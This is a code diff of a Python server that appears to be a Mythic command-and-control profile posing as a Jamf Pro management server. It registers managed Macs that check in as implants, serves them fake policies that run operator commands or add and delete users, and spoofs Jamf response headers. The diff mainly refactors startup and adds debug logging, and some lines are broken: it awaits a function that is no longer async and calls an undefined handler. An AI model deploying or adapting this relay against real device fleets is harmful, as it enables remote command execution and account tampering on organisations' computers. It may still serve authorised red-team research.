@@ -1,13 +1,9 @@
 #!/usr/bin/env python3
 
-from sanic import Sanic
-from sanic.response import html, redirect, text, raw
-from sanic.exceptions import NotFound
 import sys
 import asyncio
 import ssl
 from pathlib import Path
-import requests
 import json
 import os
 import base64
@@ -16,18 +12,32 @@ import defusedxml.ElementTree as ET
 from xml.etree.ElementTree import register_namespace
 from time import time
 
+from sanic import Sanic
+from sanic.response import html, redirect, text, raw
+from sanic.worker.loader import AppLoader
+from functools import partial
+
+import requests
+
+from mythic_container.C2ProfileBase import *
+
 config = {}
 
 uuid_list = []
 
 
-async def print_flush(message):
+
+def print_flush(message):
     print(message)
     sys.stdout.flush()
 
-
 async def server_error_handler(request, exception):
-    return html("Error: Requested URL {} not found".format(request.url), status=404, headers=config[request.app.name]['headers'])
+    request_app_name = request.app.name.split("jamfserver_")[1]
+    return html("Error: Requested URL {} not found".format(request.url), status=404, headers=config[request_app_name]['headers'])
+
+
+async def agent_message2(request, **kwargs):
+    return text("test")
 
 
 async def agent_message(request, **kwargs):
@@ -35,13 +45,13 @@ async def agent_message(request, **kwargs):
     
     PayloadUUID = request.url.split('UUID-')[1].split('/')[0].replace('/', '')
     uuid_present = None
+    request_app_name = request.app.name.split("jamfserver_")[1]
 
     try:
-        if config[request.app.name]['debug']:
-            await print_flush("agent_message request from: {} with {} and {}".format(request.url, request.cookies, request.headers))
-            await print_flush(" and URI: {}".format(request.query_string))
-        if config[request.app.name]['debug']:
-            await print_flush("Forwarding along to: {}".format(config['mythic_address']))
+        if config[request_app_name]['debug']:
+            print_flush("agent_message request from: {} with {} and {}".format(request.url, request.cookies, request.headers))
+            print_flush(" and URI: {}".format(request.query_string))
+            print_flush("Forwarding along to: {}".format(config['mythic_address']))
         if request.method == "POST":
             # manipulate the request if needed
             #await MythicCallbackRPC().add_event_message(message="got a POST message")
@@ -52,9 +62,7 @@ async def agent_message(request, **kwargs):
             commandType = content.find('commandType')
 
             if commandType.text != "com.jamfsoftware.jamf.checkforpoliciesrequest" and commandType.text != "com.jamfsoftware.jamf.submitpolicylogrequest":
-                return raw("Not implemented.".encode('utf-8'), headers=config[request.app.name]['headers'], status=501)
-
-            
+                return raw("Not implemented.".encode('utf-8'), headers=config[request_app_name]['headers'], status=501)
 
             device = xml.find('device')
             hardware_uuid = device.find('uuid').text
@@ -64,10 +72,14 @@ async def agent_message(request, **kwargs):
                     PayloadUUID = uuid_object["payload_uuid"]
                     # If the device has already checked-in set this value to True
                     uuid_present = True
-                    
+                    if config[request_app_name]['debug']:
+                        print_flush("uuid_object was found in uuid_list.")
+                            
             
             # If the device has never checked in before create a new object, replace this with a db
             if uuid_present != True:
+                if config[request_app_name]['debug']:
+                    print_flush("UUID Not Present -> initial_enrollment")    
                 uuid_list.append({"hardware_uuid" : hardware_uuid, "payload_uuid" : PayloadUUID})
                 
                 response = initial_enrollment(request, hardware_uuid, PayloadUUID)
@@ -82,21 +94,94 @@ async def agent_message(request, **kwargs):
                         if uuid_object["payload_uuid"] != new_uuid:
                             uuid_object["payload_uuid"] = new_uuid
             else:
+                if config[request_app_name]['debug']:
+                    print_flush("UUID Found")
+
                 if commandType.text == "com.jamfsoftware.jamf.submitpolicylogrequest":
+                    if config[request_app_name]['debug']:
+                        print_flush(" -> parse_response")
                     response = parse_response(xml, PayloadUUID, request)
                 else:
+                    if config[request_app_name]['debug']:
+                        print_flush(" -> parse_response")
                     response = device_checkin(request, hardware_uuid, PayloadUUID, xml)
                 
+                if config[request_app_name]['debug']:
+                    print_flush("Returning response")
                 return response
 
-        return raw(response.content, headers=config[request.app.name]['headers'], status=response.status_code)
+        return raw(response.content, headers=config[request_app_name]['headers'], status=response.status_code)
     
     except Exception as e:
-        if config[request.app.name]['debug']:
+        if config[request_app_name]['debug']:
             await print_flush("error in agent_message: {}".format(str(e)))
         return await no_match(request, NotFound)
 
+
+def setup_jamfserver():
+    try:
+        sys.path.append("/Mythic/mythic")
+        config_file = open("config.json", 'rb')
+        main_config = json.loads(config_file.read().decode('utf-8'))
+        print_flush("Opening config and starting instances...")
+
+        # basic mapping of the general endpoints to the real endpoints
+        try:
+            config['mythic_address'] = os.environ['MYTHIC_ADDRESS']
+        except Exception as e:
+            print("failed to find MYTHIC_ADDRESS environment variable")
+            sys.stdout.flush()
+            sys.exit(1)
+        
+        # now look at the specific instances to start
+        for inst in main_config['instances']:
+            config[str(inst['port'])] = {'debug': inst['debug'],
+                                        'headers': inst['ServerHeaders']}
+            if inst['debug']:
+                print("Debugging statements are enabled. This gives more context, but might be a performance hit")
+            else:
+                print("Debugging statements are disabled")
+            sys.stdout.flush()
+            # now to create an app instance to handle responses
+            app = Sanic("jamfserver_" + str(inst['port']))
+            app.config['REQUEST_MAX_SIZE'] = 1000000000
+            app.config['REQUEST_TIMEOUT'] = 600
+            app.config['RESPONSE_TIMEOUT'] = 600
+            #app.prepare(host="0.0.0.0", port=inst['port'], dev=True)
+            app.error_handler.add(Exception, server_error_handler)
+            keyfile = Path(inst['key_path'])
+            certfile = Path(inst['cert_path'])
+            if keyfile.is_file() and certfile.is_file():
+                context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH)
+                context.load_cert_chain(inst['cert_path'], keyfile=inst['key_path'])
+                if inst['debug']:
+                    app.prepare(host="0.0.0.0", port=inst['port'], ssl=context, debug=True, access_log=True)
+                else:
+                    app.prepare(host="0.0.0.0", port=inst['port'], ssl=context, debug=False, access_log=False)
+                if inst['debug']:
+                    print("using SSL for port {}".format(inst['port']))
+                    sys.stdout.flush()
+            else:
+                if inst['debug']:
+                    print("not using SSL for port {}".format(inst['port']))
+                    sys.stdout.flush()
+                if inst['debug']:
+                    app.prepare(host="0.0.0.0", port=inst['port'], debug=True, access_log=True)
+                else:
+                    app.prepare(host="0.0.0.0", port=inst['port'], debug=False, access_log=False)
+
+        app.add_route(agent_message, "/<uri:path>", methods=['GET','POST'])
+        #app.add_route(agent_message, "/", methods=['GET','POST'])
+        return app
+    
+    except Exception as e:
+        print(e)
+        exit
+
 def initial_enrollment(request, hardware_uuid, PayloadUUID):
+    request_app_name = request.app.name.split("jamfserver_")[1]
+    if config[request_app_name]['debug']:
+        print_flush("Into: initial_enrollment, hardware_uuid: " + hardware_uuid + ", PayloadUUID: " + PayloadUUID)
 
     raw_body_message = (PayloadUUID + json.dumps({
                 "action": "checkin",
@@ -110,10 +195,19 @@ def initial_enrollment(request, hardware_uuid, PayloadUUID):
 
     message = raw_body_message.encode('utf-8')
     body_message = base64.b64encode(message)
+
+    if config[request_app_name]['debug']:
+        print_flush("Preparing initial registration")
+
     response = requests.post(config['mythic_address'], data=body_message, verify=False, cookies=request.cookies, headers={"Mythic": "jamfserver"})
+
+    
     return response
 
 def device_checkin(request, hardware_uuid, PayloadUUID, xml):
+    request_app_name = request.app.name.split("jamfserver_")[1]
+    if config[request_app_name]['debug']:
+        print_flush("Into: device_checkin")
 
     raw_body_message = (PayloadUUID + json.dumps({
                 "action": "get_tasking",
@@ -125,18 +219,30 @@ def device_checkin(request, hardware_uuid, PayloadUUID, xml):
     
     base64_value = base64.b64decode(response.content).decode("utf-8")
     response_json = json.loads(base64_value[base64_value.find('{'):])
+
+    if config[request_app_name]['debug']:
+        print_flush("Finding Tasks:")
+
     for task in response_json['tasks']:
         if task['command'] == "execute_command":
-            response = execute_policy(xml, task)
+            if config[request_app_name]['debug']:
+                print_flush("Need to execute_command")
+            response = execute_policy(xml, task, request_app_name)
         elif task['command'] == "add_user":
+            if config[request_app_name]['debug']:
+                print_flush("Need to add_user")
             response = add_user(xml, task)
         elif task['command'] == "delete_user":
+            if config[request_app_name]['debug']:
+                print_flush("Need to delete_user")
             response = delete_user(xml, task)
 
     return response
 
 
-def execute_policy(xml, task):
+def execute_policy(xml, task, request_app_name):
+    if config[request_app_name]['debug']:
+        print_flush("Into: execute_policy")
     # Get the XML from the request and then add in the command to be executed
 
 
@@ -258,72 +364,8 @@ def parse_response(xml, PayloadUUID, request):
     response = raw(response_body, headers={'JSS-Version' : '10.15.1-t1569637051', 'Jamf-Content-Encrypt-Alg' : 'None'}, status=200)
     return response
 
-
-if __name__ == "__main__":
-    sys.path.append("/Mythic/mythic")
-    from mythic_c2_container.C2ProfileBase import *
-    from mythic_c2_container.MythicCallbackRPC import *
-    config_file = open("config.json", 'rb')
-    main_config = json.loads(config_file.read().decode('utf-8'))
-    print("Opening config and starting instances...")
-    sys.stdout.flush()
-    # basic mapping of the general endpoints to the real endpoints
-    try:
-        config['mythic_address'] = os.environ['MYTHIC_ADDRESS']
-    except Exception as e:
-        print("failed to find MYTHIC_ADDRESS environment variable")
-        sys.stdout.flush()
-        sys.exit(1)
-    # now look at the specific instances to start
-    for inst in main_config['instances']:
-        config[str(inst['port'])] = {'debug': inst['debug'],
-                                     'headers': inst['ServerHeaders']}
-        if inst['debug']:
-            print("Debugging statements are enabled. This gives more context, but might be a performance hit")
-        else:
-            print("Debugging statements are disabled")
-        sys.stdout.flush()
-        # now to create an app instance to handle responses
-        app = Sanic(str(inst['port']))
-        app.config['REQUEST_MAX_SIZE'] = 1000000000
-        app.config['REQUEST_TIMEOUT'] = 600
-        app.config['RESPONSE_TIMEOUT'] = 600
-        app.add_route(agent_message, "/<uri:path>", methods=['GET','POST'])
-        app.add_route(agent_message, "/", methods=['GET','POST'])
-        app.error_handler.add(Exception, server_error_handler)
-        keyfile = Path(inst['key_path'])
-        certfile = Path(inst['cert_path'])
-        if keyfile.is_file() and certfile.is_file():
-            context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH)
-            context.load_cert_chain(inst['cert_path'], keyfile=inst['key_path'])
-            if inst['debug']:
-                server = app.create_server(host="0.0.0.0", port=inst['port'], ssl=context, debug=False, return_asyncio_server=True, access_log=True)
-            else:
-                server = app.create_server(host="0.0.0.0", port=inst['port'], ssl=context, debug=False, return_asyncio_server=True, access_log=False)
-            if inst['debug']:
-                print("using SSL for port {}".format(inst['port']))
-                sys.stdout.flush()
-        else:
-            if inst['debug']:
-                print("not using SSL for port {}".format(inst['port']))
-                sys.stdout.flush()
-            if inst['debug']:
-                server = app.create_server(host="0.0.0.0", port=inst['port'], debug=False, return_asyncio_server=True, access_log=True)
-            else:
-                server = app.create_server(host="0.0.0.0", port=inst['port'], debug=False, return_asyncio_server=True, access_log=False)
-        task = asyncio.ensure_future(server)
-
-    try:
-        loop = asyncio.get_event_loop()
-        def callback(fut):
-            try:
-                fetch_count = fut.result()
-            except:
-                print("port already in use")
-                sys.stdout.flush()
-                sys.exit()
-        task.add_done_callback(callback)
-        loop.run_forever()
-    except:
-        sys.exit()
-        loop.stop()                                     
+if __name__ == '__main__':
+    loader = AppLoader(factory=partial(setup_jamfserver))
+    app = loader.load()
+    
+    Sanic.serve(primary=app, app_loader=loader)
